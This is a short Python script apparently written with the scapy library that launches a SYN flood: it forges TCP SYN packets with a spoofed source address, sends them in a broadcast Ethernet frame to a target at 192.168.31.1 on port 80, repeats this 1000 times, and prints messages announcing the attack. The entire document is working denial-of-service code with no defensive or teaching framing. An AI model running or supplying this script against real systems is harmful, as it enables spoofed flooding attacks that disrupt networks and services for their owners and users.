import scapy.all as scapy

fake_ip = "203.0.113.99"
target_ip = "192.168.31.1"

print(f"SYN Flood is being started. Source: {fake_ip} --> Target: {target_ip}")

# L2 broadcast is being started
pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.IP(src=fake_ip, dst=target_ip) / scapy.TCP(dport=80, flags="S")

# Packets are being sent
scapy.sendp(pkt, count=1000, verbose=False)

print("Attack is finished.")